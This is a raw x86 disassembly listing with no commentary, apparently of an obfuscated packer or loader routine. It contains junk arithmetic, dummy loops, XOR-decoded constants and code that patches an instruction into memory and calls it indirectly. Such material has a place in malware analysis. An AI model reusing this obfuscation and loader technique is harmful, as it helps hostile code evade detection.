  40e63a:	push   esp
  40e63b:	pop    esi
  40e63c:	inc    esp
  40e63d:	add    DWORD PTR [edi+0x19],ebp
  40e640:	int3   
  40e641:	xchg   esi,eax
  40e642:	dec    ebp
  40e643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e644:	aam    0xf4
  40e646:	pop    ss
  40e647:	cmp    BYTE PTR ds:0x31ca56a,al
  40e64d:	scas   eax,DWORD PTR es:[edi]
  40e64e:	cs adc eax,0xf27060e3
  40e654:	aas    
  40e655:	and    BYTE PTR [eax-0x70],bh
  40e658:	cld    
  40e659:	adc    al,0x6
  40e65b:	stc    
  40e65c:	mov    esp,0x9cdcd180
  40e661:	cmp    DWORD PTR [eax-0x2b],ebx
  40e664:	jo     0x40e645
  40e666:	push   edx
  40e667:	gs push ebp
  40e669:	imul   ecx,DWORD PTR [eax],0x61b699
  40e66f:	or     BYTE PTR [ebp+0x4db69e22],0x6f
  40e676:	sub    esp,edi
  40e678:	ins    DWORD PTR es:[edi],dx
  40e679:	pop    edx
  40e67a:	scas   eax,DWORD PTR es:[edi]
  40e67b:	dec    ebx
  40e67c:	ja     0x40e6bc
  40e67e:	jge    0x40e6e7
  40e680:	and    al,0xaa
  40e682:	shr    ebp,cl
  40e684:	inc    eax
  40e685:	add    ah,BYTE PTR [ebx-0x5bc5ece1]
  40e68b:	nop
  40e68c:	(bad)  
  40e68d:	in     eax,0xce
  40e68f:	int3   
  40e690:	aad    0x4e
  40e692:	jle    0x40e61e
  40e694:	ss dec edx
  40e696:	push   cs
  40e697:	mov    edx,0x92a344ce
  40e69c:	sub    WORD PTR [edx+esi*8],bx
  40e6a0:	test   al,0xbd
  40e6a2:	mov    ecx,0xde39e4a3
  40e6a7:	push   eax
  40e6a8:	(bad)  
  40e6a9:	mov    ds:0x8e34f1b5,al
  40e6ae:	push   edx
  40e6af:	dec    ebx
  40e6b0:	test   al,0x5c
  40e6b2:	pop    eax
  40e6b3:	adc    BYTE PTR [esp+ecx*4],dh
  40e6b6:	mov    bl,0xfc
  40e6b8:	fstp   TBYTE PTR [eax-0x3]
  40e6bb:	pop    ebx
  40e6bc:	xor    eax,0x8d71f721
  40e6c1:	ret    
  40e6c2:	out    dx,al
  40e6c3:	jmp    0x4726fbb8
  40e6c8:	aad    0x5f
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434613,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x4345c3,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x434547
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x43453b,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434503,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x434537,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x4345c7,0x4344df
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x4344eb,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x43453b,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x4345d3,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x4345d3
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x4345d3,edi
  40e76a:	cmp    DWORD PTR ds:0x4345d3,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x4345d3,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x4344eb
  40e789:	push   0x6202
  40e78e:	push   0x434688
  40e793:	push   0x434771
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x4345d3,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x4345d3
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x4345d3,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x43457b,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x43457b
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x43457b,edi
  40e7d9:	cmp    DWORD PTR ds:0x43457b,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x43457b,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43481f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x43453b,0x17
  40e815:	cmp    DWORD PTR ds:0x43453b,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x43453b,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x43453b
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x43453b,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43458b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x4345bf,0x434507
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x4344f3
  40e870:	and    ecx,DWORD PTR ds:0x4345cf
  40e876:	mov    DWORD PTR ds:0x4344f3,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x434547,0x13
  40e889:	cmp    DWORD PTR ds:0x434547,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x434547,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x434547,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x434547
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x434547,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x434547
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x434547,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x43457b,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x43457b
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x43457b,edi
  40e900:	cmp    DWORD PTR ds:0x43457b,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x43457b,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x4346f3
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x43457b,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x43457b
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x43457b,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x43453f,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434587
  40e958:	adc    DWORD PTR ds:0x4345b7,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43451b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x434557
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x4345b3
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x4344ff,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x434547,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x4344fb
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x4344fb,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x4345f7
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x4345c7
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x4345ff,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434603,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x4344f7,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x434547,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x4345bf,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x434547,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x4345bb
  40ea3e:	sub    DWORD PTR ds:0x4345bf,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43458f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434503,0x4345c3
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43458b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434503,0x43454f
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x4345bf,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x43453f,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x4344ef,0x434503
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434503
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434593
  40eac7:	and    DWORD PTR ds:0x434543,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43460f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x43453f,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x43453f
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x43453f,ecx
  40eb04:	cmp    DWORD PTR ds:0x43453f,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x43453f,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x43453f,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x43453f
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x43453f,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x434547
  40eb55:	sbb    edx,DWORD PTR ds:0x434607
  40eb5b:	mov    DWORD PTR ds:0x434547,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43460b
  40eb6a:	or     DWORD PTR ds:0x4345bb,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x434537
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43460f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43460b,0x4345c7
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x43454f,0x434507
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x4345bf,0x4345fb
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x4344f7,0x434577
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x4344e3,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434583,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x43453b,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x434543,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434613,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x43457b,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434603,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x4344e7,0x43458f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434593,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434593
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434593,eax
  40ec60:	cmp    DWORD PTR ds:0x434593,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434593,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434593
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434593,eax
  40ec91:	cmp    DWORD PTR ds:0x434593,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x4344e3
  40eca5:	adc    eax,DWORD PTR ds:0x43457b
  40ecab:	mov    ds:0x4344e3,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x43453f,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x4345f7,0x434503
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x43457b
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x434537,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x4345fb
  40ecfd:	or     DWORD PTR ds:0x434613,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x434543,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x434577,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x4345d3,0x434537
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x4345f7,0x4344ff
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x434537,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434507,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x43453f,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434507,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x4345ff,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434607,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x4345c7,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x4345c7
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x4345c7,ecx
  40edb2:	cmp    DWORD PTR ds:0x4345c7,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x43485b
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x4345c7,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x43454f,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x4345c3,0x4345f7
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x4344ff,0x4344ef
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x43453b,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x4344ef
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x4344ff,0x13
  40ee32:	cmp    DWORD PTR ds:0x4344ff,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x4344ff,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x43485b
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x4344ff
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x4344ff,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
